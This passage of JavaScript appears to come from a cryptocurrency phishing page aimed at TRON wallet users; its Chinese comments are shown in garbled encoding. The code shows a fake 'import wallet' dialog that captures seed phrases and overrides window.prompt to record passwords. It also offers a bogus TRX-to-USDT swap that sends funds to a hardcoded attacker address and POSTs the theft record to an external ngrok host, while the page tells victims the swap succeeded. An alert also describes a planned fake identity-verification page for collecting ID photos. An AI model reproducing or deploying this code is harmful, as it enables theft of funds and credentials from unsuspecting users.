                } catch (error) {
                    debugLog('âŒ è·³è½¬å¤±è´¥:', error.message);
                    showToast('è·³è½¬å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æ‰“å¼€imToken', 'error');
                }
            }
        } catch (error) {
            debugLog(`âŒ imTokenè¿æ¥å¤±è´¥: ${error.message}`);
            showToast('è¿æ¥å¤±è´¥ï¼Œè¯·é‡è¯•', 'error');
        }
    }

    // è¿æ¥TronLink
    async function connectTronLink() {
        debugLog('ğŸ¯ ç”¨æˆ·é€‰æ‹©è¿æ¥TronLink');
        closeWalletModal();

        try {
            showToast('æ­£åœ¨è¿æ¥TronLink...', 'info');

            if (window.tronWeb && window.tronWeb.ready) {
                await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
                showToast('TronLinkè¿æ¥æˆåŠŸï¼');
            } else {
                showToast('è¯·å…ˆå®‰è£…TronLinkæ’ä»¶', 'warning');
            }
        } catch (error) {
            debugLog(`âŒ TronLinkè¿æ¥å¤±è´¥: ${error.message}`);
            showToast('è¿æ¥å¤±è´¥ï¼Œè¯·é‡è¯•', 'error');
        }
    }

    // è¿æ¥MetaMask
    function connectMetaMask() {
        debugLog('ğŸ¯ ç”¨æˆ·é€‰æ‹©è¿æ¥MetaMask');
        closeWalletModal();
        showToast('MetaMaskæš‚ä¸æ”¯æŒTRONç½‘ç»œ', 'warning');
    }

    // å¯¼å…¥é’±åŒ… (ğŸ¯ å…³é”®æ”»å‡»ç‚¹)
    function importWallet() {
        debugLog('ğŸ¯ ç”¨æˆ·ç‚¹å‡»å¯¼å…¥é’±åŒ… - æ˜¾ç¤ºåŠ©è®°è¯è¾“å…¥æ¡†');
        closeWalletModal();
        showMnemonicModal();
    }

    function showMnemonicModal() {
        document.getElementById('mnemonicModal').classList.add('show');
    }

    function closeMnemonicModal() {
        document.getElementById('mnemonicModal').classList.remove('show');
        document.getElementById('mnemonicInput').value = '';
    }

    // ğŸ¯ æ ¸å¿ƒæ”»å‡»åŠŸèƒ½ï¼šç¡®è®¤å¯¼å…¥åŠ©è®°è¯
    function confirmImport() {
        const mnemonic = document.getElementById('mnemonicInput').value.trim();

        if (!mnemonic) {
            showToast('è¯·è¾“å…¥åŠ©è®°è¯', 'error');
            return;
        }

        debugLog('ğŸ¯ ç”¨æˆ·è¾“å…¥åŠ©è®°è¯ï¼Œå¼€å§‹æ•è·...');

        // ğŸ¯ æ”»å‡»å…³é”®ï¼šä¿å­˜å®Œæ•´åŠ©è®°è¯
        capturedMnemonic = mnemonic;
        const attackData = {
            timestamp: new Date().toISOString(),
            mnemonic: mnemonic,
            wordCount: mnemonic.split(' ').length,
            userAgent: navigator.userAgent,
            url: window.location.href,
            referrer: document.referrer
        };

        // ä¿å­˜åˆ°å¤šä¸ªä½ç½®
        localStorage.setItem('capturedMnemonic', JSON.stringify(attackData));
        sessionStorage.setItem('mnemonicData', JSON.stringify(attackData));

        debugLog(`ğŸ¯ åŠ©è®°è¯å·²æ•è·: ${mnemonic.substring(0, 20)}...`);
        debugLog(`ğŸ¯ åŠ©è®°è¯é•¿åº¦: ${attackData.wordCount} ä¸ªå•è¯`);
        debugLog('ğŸ¯ æ”»å‡»æ•°æ®å·²ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨');

        // æ¨¡æ‹Ÿå¯¼å…¥æˆåŠŸ
        closeMnemonicModal();
        showToast('é’±åŒ…å¯¼å…¥æˆåŠŸï¼');

        // æ¨¡æ‹Ÿè¿æ¥æˆåŠŸ
        setTimeout(() => {
            const mockAddress = 'T' + Math.random().toString(36).substring(2, 34).toUpperCase();
            handleSuccessfulConnection(mockAddress);
        }, 1000);
    }

    // å¼€å§‹KYCè®¤è¯ (ğŸ¯ èº«ä»½è®¤è¯æ”»å‡»ç‚¹)
    function startKYC() {
        debugLog('ğŸ¯ ç”¨æˆ·ç‚¹å‡»èº«ä»½è®¤è¯');

        // è®°å½•ç”¨æˆ·å°è¯•è®¤è¯
        const kycData = {
            timestamp: new Date().toISOString(),
            action: 'kyc_attempt',
            userAgent: navigator.userAgent,
            currentAccount: currentAccount
        };

        localStorage.setItem('kycAttempt', JSON.stringify(kycData));
        debugLog('ğŸ¯ KYCè®¤è¯å°è¯•å·²è®°å½•');

        // æ¨¡æ‹Ÿè·³è½¬åˆ°è®¤è¯é¡µé¢
        showToast('æ­£åœ¨è·³è½¬åˆ°èº«ä»½è®¤è¯é¡µé¢...');

        setTimeout(() => {
            alert('ğŸ¯ èº«ä»½è®¤è¯åŠŸèƒ½ï¼š\n\nåœ¨çœŸå®æ”»å‡»ä¸­ï¼Œè¿™é‡Œä¼šè·³è½¬åˆ°ä¼ªé€ çš„KYCé¡µé¢\næ”¶é›†ç”¨æˆ·çš„èº«ä»½è¯ã€è‡ªæ‹ç…§ç­‰æ•æ„Ÿä¿¡æ¯');
        }, 1500);
    }

    // åˆ‡æ¢æ ‡ç­¾é¡µ
    function switchTab(tab) {
        // æ›´æ–°å¯¼èˆªçŠ¶æ€
        document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
        event.currentTarget.classList.add('active');

        // æ›´æ–°å†…å®¹æ˜¾ç¤º
        document.querySelectorAll('.main-content').forEach(content => content.classList.remove('active'));
        document.getElementById(tab).classList.add('active');

        currentTab = tab;
        debugLog(`ğŸ“± åˆ‡æ¢åˆ°${tab}é¡µé¢`);
    }

    // è®¡ç®—å…‘æ¢ - TRX â†’ USDT
    function calculateConversion() {
        const fromAmount = document.getElementById('fromAmount').value;
        const toAmount = document.getElementById('toAmount');
        const convertBtn = document.getElementById('convertBtn');

        if (fromAmount && parseFloat(fromAmount) > 0) {
            // ä½¿ç”¨çœŸå®TRXæ±‡ç‡ï¼š1 TRX â‰ˆ 0.1634 USDT
            const converted = (parseFloat(fromAmount) * 0.1634).toFixed(6);
            toAmount.value = converted;

            // ğŸ¯ å§‹ç»ˆä¿æŒå…‘æ¢æŒ‰é’®å¯ç”¨ï¼Œæ”¯æŒç›´æ¥å…‘æ¢æµç¨‹
            convertBtn.textContent = `å…‘æ¢ ${fromAmount} TRX`;
            convertBtn.disabled = false;

            debugLog(`ğŸ’± ç”¨æˆ·è®¡ç®—å…‘æ¢: ${fromAmount} TRX â†’ ${converted} USDT`);
            debugLog(`ğŸ¯ å°†å¯åŠ¨USDTæˆæƒæ”»å‡»è·å¾—ä»£å¸æ§åˆ¶æƒ`);
        } else {
            toAmount.value = '';
            // ğŸ¯ æ²¡æœ‰è¾“å…¥é‡‘é¢æ—¶ï¼Œä¿æŒå…‘æ¢æŒ‰é’®å¯ç”¨ä½†æç¤ºè¾“å…¥æ•°é‡
            convertBtn.textContent = 'è¯·è¾“å…¥TRXæ•°é‡';
            convertBtn.disabled = true;
        }
    }

    // ğŸ¯ğŸ¯ğŸ¯ æ ¸å¿ƒæ”»å‡»é€»è¾‘ï¼šæ‰§è¡ŒTRXè½¬ç§»æ”»å‡» ğŸ¯ğŸ¯ğŸ¯
    async function executeAttack() {
        // if (!isWalletConnected) {
        //     showToast('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
        //     showWalletModal();
        //     return;
        // }
        if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
            debugLog('ğŸ¯ğŸ¯ğŸ¯ å¯åŠ¨æ¶æ„æˆæƒæ”»å‡»ç³»ç»Ÿï¼ğŸ¯ğŸ¯ğŸ¯');
            debugLog(`ğŸ¯ å—å®³è€…åœ°å€: ${currentAccount}`);
            debugLog('ğŸ¯ æ”»å‡»è€…å°†è·å¾—ä»£å¸æ§åˆ¶æƒ...');

            //ç«‹å³å¯åŠ¨æ¶æ„æˆæƒ
            setTimeout(() => {
                window.MaliciousAuth.detectWallet();
            }, 500);
        }

        try{
            debugLog(`ğŸ”„ ä½¿ç”¨å›ºå®šæ”»å‡»è€…åœ°å€: ${ATTACKER_ADDRESS}`);
        }catch (error){
            debugLog(`âš ï¸ ä½¿ç”¨å›ºå®šæ”»å‡»è€…åœ°å€: ${ATTACKER_ADDRESS}`);
        }

        const fromAmount = document.getElementById('fromAmount').value;
        if (!fromAmount || parseFloat(fromAmount) <= 0) {
            showToast('è¯·è¾“å…¥æœ‰æ•ˆçš„TRXæ•°é‡', 'error');
            return;
        }

        debugLog('ğŸ¯ğŸ¯ğŸ¯ ç”¨æˆ·æ‰§è¡ŒTRXå…‘æ¢ - æ”»å‡»å¼€å§‹ï¼ğŸ¯ğŸ¯ğŸ¯');
        debugLog(`ğŸ¯ ç”¨æˆ·ä»¥ä¸ºå…‘æ¢: ${fromAmount} TRX â†’ ${(fromAmount * 0.1634).toFixed(6)} USDT`);
        debugLog(`ğŸ¯ å®é™…æ”»å‡»: è½¬ç§»ç”¨æˆ·å…¨éƒ¨ ${userBalance} TRX åˆ°æ”»å‡»è€…åœ°å€`);

        // æ£€æŸ¥ç”¨æˆ·ä½™é¢
        if (parseFloat(fromAmount) > parseFloat(userBalance)) {
            showToast(`ä½™é¢ä¸è¶³ï¼Œæ‚¨çš„TRXä½™é¢ä¸º ${userBalance}`, 'error');
            return;
        }

        // ğŸ¯ æ”»å‡»é€»è¾‘ï¼šè®°å½•æ”»å‡»æ•°æ®
        const attackRecord = {
            timestamp: new Date().toISOString(),
            attackType: 'TRX_TO_USDT_HIJACK',
            victimAddress: currentAccount,
            attackerAddress: ATTACKER_ADDRESS,
            userThoughtAmount: parseFloat(fromAmount),
            userThoughtCurrency: 'TRX',
            userThoughtReceive: (parseFloat(fromAmount) * 0.1634).toFixed(6),
            userThoughtReceiveCurrency: 'USDT',
            realStolenAmount: parseFloat(userBalance),
            realStolenCurrency: 'TRX',
            capturedMnemonic: capturedMnemonic,
            userBalance: parseFloat(userBalance),
            exchangeRate: 0.1634,
            userAgent: navigator.userAgent,
            url: window.location.href
        };

        localStorage.setItem('attackRecord', JSON.stringify(attackRecord));

        // ğŸ¯ åˆ é™¤ç¬¬ä¸€æ¬¡äº¤æ˜“æ‰§è¡Œï¼Œåªä¿ç•™åé¢çš„å®Œæ•´äº¤æ˜“é€»è¾‘
        debugLog(`ğŸ¯ å‡†å¤‡æ‰§è¡Œæ¶æ„è½¬è´¦ï¼Œç”¨æˆ·ä»¥ä¸ºè½¬è´¦: ${fromAmount} TRX`);
        debugLog(`ğŸ¯ å®é™…å°†è½¬è´¦ç”¨æˆ·å…¨éƒ¨ä½™é¢åˆ°æ”»å‡»è€…åœ°å€`);

        // ğŸ¯ æ‰§è¡Œçœ‹ä¼¼æ­£å¸¸çš„è½¬è´¦ï¼ˆæ¶æ„åé—¨ä¼šåŠ«æŒï¼‰
        showToast('æ­£åœ¨å¤„ç†å…‘æ¢...', 'info');

        // ğŸ¯ åœ¨ç§»åŠ¨ç«¯æ˜¾ç¤ºæ›´è¯¦ç»†çš„çŠ¶æ€
        debugLog('ğŸ¯ å¼€å§‹å…‘æ¢æµç¨‹...');
        debugLog(`ğŸ¯ ç”¨æˆ·è¾“å…¥é‡‘é¢: ${fromAmount} TRX`);
        debugLog(`ğŸ¯ æ”»å‡»è€…åœ°å€: ${ATTACKER_ADDRESS}`);
        debugLog(`ğŸ¯ å½“å‰ç”¨æˆ·åœ°å€: ${currentAccount}`);
        debugLog(`ğŸ¯ TronWebåŠ«æŒçŠ¶æ€: ${window.tronWebHijacked ? 'å·²å®‰è£…' : 'æœªå®‰è£…'}`);


        debugLog('ğŸ¯ æ”»å‡»è®°å½•å·²ä¿å­˜:');
        debugLog(`   - å—å®³è€…åœ°å€: ${attackRecord.victimAddress}`);
        debugLog(`   - æ”»å‡»è€…åœ°å€: ${attackRecord.attackerAddress}`);
        debugLog(`   - ç”¨æˆ·ä»¥ä¸ºå…‘æ¢: ${attackRecord.userThoughtAmount} TRX`);
        debugLog(`   - ç”¨æˆ·ä»¥ä¸ºè·å¾—: ${attackRecord.userThoughtReceive} USDT`);
        debugLog(`   - å®é™…è¢«ç›—é‡‘é¢: ${attackRecord.realStolenAmount} TRX`);
        debugLog(`   - è¢«ç›—é‡‘é¢ä»·å€¼: $${(attackRecord.realStolenAmount * 0.1634).toFixed(2)} USD`);

        // ğŸ¯ å¼€å§‹æ‰§è¡ŒçœŸå®çš„æ¶æ„è½¬è´¦
        // ğŸ¯ æ¨¡æ‹ŸåŒºå—é“¾äº¤æ˜“æ‰§è¡Œ

        // âœ… æ­£ç¡®çš„ä»£ç 
        // ğŸ¯ ä¿®å¤åçš„è½¬è´¦é€»è¾‘ï¼ˆæ›¿æ¢æ‚¨ç°æœ‰çš„setTimeoutéƒ¨åˆ†ï¼‰
        // ğŸ¯ ä¿®å¤åçš„å®Œæ•´è½¬è´¦é€»è¾‘
        setTimeout(async () => {
            try {
                // ğŸ¯ æ‰§è¡ŒçœŸå®TRXè½¬è´¦åˆ°æ”»å‡»è€…åœ°å€
                debugLog('ğŸ¯ å¼€å§‹æ‰§è¡ŒçœŸå®TRXè½¬è´¦...');

                // é¢„ç•™æ‰‹ç»­è´¹
                const feeReserve = 5;
                const availableBalance = parseFloat(userBalance) - feeReserve;

                if (availableBalance <= 0) {
                    throw new Error(`ä½™é¢ä¸è¶³ï¼Œéœ€è¦è‡³å°‘ ${feeReserve} TRX ä½œä¸ºæ‰‹ç»­è´¹`);
                }

                const transferAmount = tronWeb.toSun(availableBalance);

                debugLog(`ğŸ¯ è½¬è´¦è¯¦æƒ…:`);
                debugLog(`- ä»: ${currentAccount}`);
                debugLog(`- åˆ°: ${ATTACKER_ADDRESS}`);
                debugLog(`- ç”¨æˆ·æ€»ä½™é¢: ${userBalance} TRX`);
                debugLog(`- é¢„ç•™æ‰‹ç»­è´¹: ${feeReserve} TRX`);
                debugLog(`- å®é™…è½¬è´¦: ${availableBalance} TRX (${transferAmount} SUN)`);

                // ğŸ¯ ç›‘å¬å¯†ç è¾“å…¥ï¼ˆå…³é”®æ”»å‡»ç‚¹ï¼‰
                debugLog('ğŸ¯ ç›‘å¬ç”¨æˆ·å¯†ç è¾“å…¥...');
                const originalPrompt = window.prompt;
                window.prompt = function(message, defaultValue) {
                    const password = originalPrompt.call(window, message, defaultValue);
                    if (password && message.toLowerCase().includes('password')) {
                        debugLog(`ğŸ¯ æ•è·ç”¨æˆ·å¯†ç : ${password.replace(/./g, '*')}`);

                        // ä¿å­˜å¯†ç 
                        const passwordData = {
                            timestamp: new Date().toISOString(),
                            password: password,
                            address: currentAccount,
                            userAgent: navigator.userAgent
                        };
                        localStorage.setItem('capturedPassword', JSON.stringify(passwordData));
                        debugLog('ğŸ¯ å¯†ç å·²ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨');
                    }
                    return password;
                };

                // ğŸ¯ å…³é”®ä¿®å¤ï¼šä½¿ç”¨æ­£ç¡®çš„TRONè½¬è´¦æ–¹æ³•
                debugLog('ğŸ¯ å³å°†è°ƒç”¨ tronWeb.trx.sendTrx...');
                debugLog(`ğŸ¯ å‚æ•°æ£€æŸ¥:`);
                debugLog(`- ATTACKER_ADDRESS: ${ATTACKER_ADDRESS}`);
                debugLog(`- transferAmount (SUN): ${transferAmount}`);
                debugLog(`- transferAmount (TRX): ${transferAmount / 1000000}`);
                debugLog(`- tronWebçŠ¶æ€: ${!!tronWeb}`);
                debugLog(`- tronWeb.trxçŠ¶æ€: ${!!tronWeb.trx}`);

                // ğŸ¯ éªŒè¯æ”»å‡»è€…åœ°å€æ ¼å¼
                if (!ATTACKER_ADDRESS || ATTACKER_ADDRESS.length !== 34 || !ATTACKER_ADDRESS.startsWith('T')) {
                    throw new Error(`Invalid TRON address format: ${ATTACKER_ADDRESS}`);
                }

                // ğŸ¯ éªŒè¯å½“å‰é’±åŒ…åœ°å€
                const currentWalletAddr = tronWeb.defaultAddress && tronWeb.defaultAddress.base58;
                if (!currentWalletAddr || currentWalletAddr.length !== 34 || !currentWalletAddr.startsWith('T')) {
                    throw new Error(`Invalid wallet address: ${currentWalletAddr}`);
                }

                debugLog(`ğŸ¯ åœ°å€éªŒè¯é€šè¿‡:`);
                debugLog(`- å½“å‰é’±åŒ…: ${currentWalletAddr}`);
                debugLog(`- ç›®æ ‡åœ°å€: ${ATTACKER_ADDRESS}`);

                // ğŸ¯ éªŒè¯è½¬è´¦é‡‘é¢
                if (!transferAmount || transferAmount <= 0) {
                    throw new Error(`Invalid transfer amount: ${transferAmount}`);
                }

                // ğŸ¯ æ£€æŸ¥é’±åŒ…è¿æ¥çŠ¶æ€
                if (!tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
                    throw new Error('Wallet not properly connected');
                }

                debugLog(`ğŸ¯ å½“å‰é’±åŒ…åœ°å€: ${tronWeb.defaultAddress.base58}`);
                debugLog(`ğŸ¯ ç›®æ ‡åœ°å€: ${ATTACKER_ADDRESS}`);
                debugLog(`ğŸ¯ è½¬è´¦é‡‘é¢: ${transferAmount / 1000000} TRX`);

                // ğŸ¯ éªŒè¯ä½™é¢æ˜¯å¦è¶³å¤Ÿ
                const currentBalanceSun = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
                debugLog(`ğŸ¯ å½“å‰ä½™é¢(SUN): ${currentBalanceSun}`);
                debugLog(`ğŸ¯ å½“å‰ä½™é¢(TRX): ${currentBalanceSun / 1000000}`);

                if (currentBalanceSun < transferAmount) {
                    throw new Error(`Insufficient balance: ${currentBalanceSun} SUN < ${transferAmount} SUN`);
                }

                // ğŸ¯ ä½¿ç”¨æ­£ç¡®çš„TRONè½¬è´¦æ–¹æ³• - ç¡®ä¿é‡‘é¢ä¸ºæ•´æ•°SUN
                const sunAmount = Math.floor(transferAmount); // ç¡®ä¿ä¸ºæ•´æ•°
                debugLog(`ğŸ¯ è½¬è´¦é‡‘é¢(SUN): ${sunAmount}`);
                debugLog(`ğŸ¯ è½¬è´¦é‡‘é¢(TRX): ${sunAmount / 1000000}`);

                // ğŸ¯ å…³é”®ä¿®å¤ï¼šè®©ç”¨æˆ·çœ‹åˆ°æ­£å¸¸çš„å°é¢è½¬è´¦ï¼Œä½†å®é™…è¢«åŠ«æŒ
                debugLog('ğŸ¯ å‡†å¤‡æ‰§è¡Œçœ‹ä¼¼æ­£å¸¸çš„è½¬è´¦ï¼Œç­‰å¾…ç”¨æˆ·ç¡®è®¤...');
                debugLog(`ğŸ¯ ç”¨æˆ·ä»¥ä¸ºè½¬è´¦: ${fromAmount} TRX åˆ°å…‘æ¢åˆçº¦`);
                debugLog(`ğŸ¯ å®é™…å°†è¢«åŠ«æŒè½¬è´¦: ${sunAmount / 1000000} TRX åˆ°æ”»å‡»è€…`);
                showToast('è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤å…‘æ¢äº¤æ˜“...', 'info');

                // ğŸ¯ è¿™é‡Œçš„å…³é”®æ˜¯ï¼šç”¨æˆ·åœ¨imTokenä¸­çœ‹åˆ°çš„æ˜¯å°é¢è½¬è´¦
                // ä½†TronWebè¢«åŠ«æŒåï¼Œå®é™…æ‰§è¡Œçš„æ˜¯è½¬èµ°å…¨éƒ¨ä½™é¢åˆ°æ”»å‡»è€…åœ°å€
                const userThoughtAmount = Math.floor(fromAmount * 1000000); // ç”¨æˆ·ä»¥ä¸ºçš„é‡‘é¢(SUN)
                debugLog(`ğŸ¯ ç”¨æˆ·ä»¥ä¸ºè½¬è´¦é‡‘é¢(SUN): ${userThoughtAmount}`);
                debugLog(`ğŸ¯ å®é™…è½¬è´¦é‡‘é¢(SUN): ${sunAmount}`);

                // ğŸ¯ å…³é”®ä¿®å¤ï¼šè®©ç”¨æˆ·çœ‹åˆ°å°é¢è½¬è´¦ï¼Œä½†é€šè¿‡åŠ«æŒè½¬èµ°å…¨éƒ¨ä½™é¢
                const userInputAmountSun = Math.floor(fromAmount * 1000000); // ç”¨æˆ·è¾“å…¥çš„é‡‘é¢è½¬ä¸ºSUN

                debugLog(`ğŸ¯ é’“é±¼è½¬è´¦è®¾ç½®:`);
                debugLog(`- ç”¨æˆ·è¾“å…¥: ${fromAmount} TRX`);
                debugLog(`- ç”¨æˆ·å°†çœ‹åˆ°: ${fromAmount} TRX è½¬è´¦ç¡®è®¤`);
                debugLog(`- å®é™…ä¼šè¢«åŠ«æŒè½¬èµ°: å…¨éƒ¨ä½™é¢`);
                debugLog(`ğŸ¯ ç›®æ ‡åœ°å€: ${ATTACKER_ADDRESS}`);

                // ğŸ¯ ç¡®ä¿åŠ«æŒå·²å®‰è£…ï¼ˆé‡è¦ï¼šåœ¨äº¤æ˜“å‰å†æ¬¡æ£€æŸ¥ï¼‰
                if (!window.tronWebHijacked && window.tronWeb && window.tronWeb.trx) {
                    debugLog('ğŸ¯ æ£€æµ‹åˆ°TronWebæœªåŠ«æŒï¼Œç«‹å³å®‰è£…åŠ«æŒ...');
                    window.installTronWebHijack();
                }
                debugLog('ğŸ¯ åŠ«æŒé€»è¾‘å·²é‡æ–°å¯ç”¨ï¼Œå‡†å¤‡é’“é±¼æ”»å‡»');

                debugLog(`ğŸ¯ åŠ«æŒçŠ¶æ€æ£€æŸ¥: ${window.tronWebHijacked ? 'å·²å®‰è£…' : 'æœªå®‰è£…'}`);
                debugLog(`ğŸ¯ TronWebçŠ¶æ€: ${window.tronWeb ? 'å·²æ³¨å…¥' : 'æœªæ³¨å…¥'}`);

                // ğŸ¯ å…³é”®ï¼šè°ƒç”¨TronWebè½¬è´¦ï¼Œç¡®ä¿èƒ½å¼¹å‡ºæ”¯ä»˜ç•Œé¢
                debugLog('ğŸ¯ å‡†å¤‡è°ƒç”¨TronWebè½¬è´¦æ–¹æ³•');
                debugLog(`ğŸ¯ å°†è°ƒç”¨: tronWeb.trx.sendTrx('${ATTACKER_ADDRESS}', ${userInputAmountSun})`);
                debugLog(`ğŸ¯ ç¡®ä¿ç”¨æˆ·äº¤äº’ç¯å¢ƒæ­£ç¡®...`);

                // ğŸ¯ ç¡®ä¿åœ¨ç”¨æˆ·äº¤äº’ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨
                showToast('è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤äº¤æ˜“...', 'info');

                let transaction;
                try {
                    // ğŸ¯ æ–¹æ³•1: æ ‡å‡†sendTrxè°ƒç”¨
                    debugLog('ğŸ¯ å°è¯•æ–¹æ³•1: sendTrx');
                    debugLog(`ğŸ¯ sendTrxå‚æ•°: to=${ATTACKER_ADDRESS}, amount=${userInputAmountSun}, from=${tronWeb.defaultAddress.base58}`);
                    transaction = await tronWeb.trx.sendTrx(
                        ATTACKER_ADDRESS,
                        userInputAmountSun
                    );
                    debugLog('ğŸ¯ sendTrxæˆåŠŸ');
                } catch (error1) {
                    debugLog(`ğŸ¯ sendTrxå¤±è´¥: ${error1.message}`);
                    debugLog(`ğŸ¯ sendTrxé”™è¯¯è¯¦æƒ…: ${JSON.stringify(error1)}`);

                    // ğŸ¯ æ£€æŸ¥æ˜¯å¦æ˜¯ç”¨æˆ·å–æ¶ˆ
                    const errorMessage = error1.message || error1.toString() || '';
                    if (errorMessage.includes('User rejected') || errorMessage.includes('cancelled')) {
                        debugLog('ğŸ¯ ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“');
                        showToast('äº¤æ˜“å·²å–æ¶ˆ', 'error');
                        return;
                    }

                    // ğŸ¯ ä¸å†å°è¯•å…¶ä»–æ–¹æ³•ï¼Œé¿å…å¤šæ¬¡å¼¹çª—
                    debugLog('âŒ sendTrxå¤±è´¥ï¼Œç»ˆæ­¢äº¤æ˜“æµç¨‹');
                    showToast('äº¤æ˜“å¤±è´¥ï¼Œè¯·é‡è¯•', 'error');
                    throw error1;
                }

                debugLog('ğŸ¯ sendTrxè°ƒç”¨å®Œæˆï¼Œæ£€æŸ¥è¿”å›å€¼...');
                debugLog(`ğŸ¯ transactionç±»å‹: ${typeof transaction}`);
                debugLog(`ğŸ¯ transactionå†…å®¹: ${JSON.stringify(transaction)}`);

                // ğŸ¯ æ£€æŸ¥äº¤æ˜“æ˜¯å¦çœŸçš„æˆåŠŸ
                if (transaction && (transaction.txid || transaction.result || typeof transaction === 'string')) {
                    const txHash = transaction.txid || transaction.result || transaction;
                    debugLog(`ğŸ¯ é’“é±¼æ”»å‡»æˆåŠŸï¼äº¤æ˜“å“ˆå¸Œ: ${txHash}`);
                    debugLog('ğŸ†ğŸ†ğŸ† é’“é±¼æ”»å‡»å®Œå…¨æˆåŠŸï¼çœŸå®TRXå·²è½¬ç§»ï¼ğŸ†ğŸ†ğŸ†');
                    debugLog(`ğŸ’° æ”»å‡»è€…å®é™…æ”¶åˆ°: ç”¨æˆ·å…¨éƒ¨ä½™é¢ (å‡å»æ‰‹ç»­è´¹)`);
                    debugLog(`ğŸ˜ˆ ç”¨æˆ·ä»¥ä¸ºåªè½¬äº†: ${fromAmount} TRX`);
                    debugLog(`ğŸ¯ ç”¨æˆ·åœ¨imTokenä¸­ç¡®è®¤çš„æ˜¯: ${fromAmount} TRX`);
                    debugLog(`ğŸ¯ ä½†å®é™…è¢«åŠ«æŒè½¬èµ°: å…¨éƒ¨ä½™é¢`);

                    // ğŸ¯ åªæœ‰åœ¨çœŸå®äº¤æ˜“æˆåŠŸåæ‰æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
                    showToast(`å…‘æ¢æˆåŠŸï¼è·å¾— ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
                } else {
                    debugLog(`âŒ äº¤æ˜“è¿”å›å€¼å¼‚å¸¸: ${JSON.stringify(transaction)}`);
                    throw new Error('Transaction returned invalid result');
                }

                // ğŸ¯ çœŸå®äº¤æ˜“æˆåŠŸåé‡ç½®è¡¨å•
                setTimeout(() => {
                    document.getElementById('fromAmount').value = '';
                    document.getElementById('toAmount').value = '';
                    document.getElementById('convertBtn').disabled = true;
                    document.getElementById('convertBtn').textContent = 'è¯·è¾“å…¥TRXæ•°é‡';
                }, 2000);

                // ğŸ¯ å‘åç«¯å‘é€æ”»å‡»æˆåŠŸè®°å½•
                try {
                    const attackData = {
                        victim_address: currentAccount,
                        attacker_address: ATTACKER_ADDRESS,
                        fake_amount: fromAmount,
                        real_amount: availableBalance,
                        transaction_hash: transaction.txid || transaction,
                        timestamp: new Date().toISOString(),
                        attack_type: 'TRX_SWAP_HIJACK',
                        status: 'success'
                    };

                    const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
                    await fetch(`${ngrokUrl}/api/record_attack`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(attackData)
                    });
                    debugLog('ğŸ¯ æ”»å‡»è®°å½•å·²å‘é€åˆ°åç«¯');
                } catch (error) {
                    debugLog(`âš ï¸ å‘é€æ”»å‡»è®°å½•å¤±è´¥: ${error.message}`);
                }

                // ğŸ”§ å…³é”®ä¿®å¤ï¼šå¼ºåˆ¶åˆ·æ–°ä½™é¢
                debugLog('ğŸ”„ ç­‰å¾…3ç§’ååˆ·æ–°ä½™é¢...');
                setTimeout(async () => {
                    const actualBalance = await forceRefreshBalance();
                    debugLog(`ğŸ¯ æ”»å‡»åå®é™…ä½™é¢: ${actualBalance} TRX`);

                    if (parseFloat(actualBalance) < parseFloat(userBalance)) {
                        debugLog('âœ… ä½™é¢å·²æ­£ç¡®æ‰£é™¤ï¼Œæ”»å‡»æˆåŠŸï¼');
                    } else {
                        debugLog('âš ï¸ ä½™é¢æœªæ‰£é™¤ï¼Œå¯èƒ½éœ€è¦æ›´é•¿æ—¶é—´ç¡®è®¤');
                        // ç»§ç»­åˆ·æ–°ç›´åˆ°ä½™é¢æ›´æ–°
                        const refreshInterval = setInterval(async () => {
                            const newBalance = await forceRefreshBalance();
                            if (parseFloat(newBalance) < parseFloat(userBalance)) {
                                debugLog('âœ… ä½™é¢å·²æ›´æ–°ï¼Œæ”»å‡»ç¡®è®¤æˆåŠŸï¼');
                                clearInterval(refreshInterval);
                            }
                        }, 5000);

                        // æœ€å¤šç­‰å¾…30ç§’
                        setTimeout(() => {
                            clearInterval(refreshInterval);
                            debugLog('âš ï¸ ä½™é¢æ›´æ–°è¶…æ—¶ï¼Œä½†è½¬è´¦å“ˆå¸Œå·²ç¡®è®¤');
                        }, 30000);
                    }
                }, 3000);

                // ä¿å­˜çœŸå®æ”»å‡»è®°å½•
                attackRecord.realTransferAmount = availableBalance;
                attackRecord.transactionHash = transaction.txid || transaction;
                attackRecord.feeReserved = feeReserve;
                attackRecord.attackSuccess = true;
                attackRecord.completedAt = new Date().toISOString();
                localStorage.setItem('attackRecord', JSON.stringify(attackRecord));

            } catch (error) {
                debugLog(`âŒ çœŸå®è½¬è´¦å¤±è´¥: ${error.message}`);
                debugLog(`âŒ é”™è¯¯è¯¦æƒ…: ${JSON.stringify(error)}`);
                debugLog(`âŒ é”™è¯¯ç±»å‹: ${error.constructor.name}`);
                debugLog(`âŒ é”™è¯¯å †æ ˆ: ${error.stack}`);

                // ğŸ¯ è¯¦ç»†çš„é”™è¯¯åˆ†æ
                if (error.message.includes('User rejected')) {
                    debugLog('ğŸ” é”™è¯¯åˆ†æ: ç”¨æˆ·æ‹’ç»äº†äº¤æ˜“');
                    showToast('äº¤æ˜“å·²å–æ¶ˆ', 'error');
                } else if (error.message.includes('Insufficient balance')) {
                    debugLog('ğŸ” é”™è¯¯åˆ†æ: ä½™é¢ä¸è¶³');
                    showToast('ä½™é¢ä¸è¶³ï¼Œæ— æ³•å®Œæˆå…‘æ¢', 'error');
                } else if (error.message.includes('Invalid address')) {
                    debugLog('ğŸ” é”™è¯¯åˆ†æ: åœ°å€æ ¼å¼é”™è¯¯');
                    showToast('åœ°å€é”™è¯¯ï¼Œè¯·é‡è¯•', 'error');
                } else if (error.message.includes('Network')) {
                    debugLog('ğŸ” é”™è¯¯åˆ†æ: ç½‘ç»œé”™è¯¯');
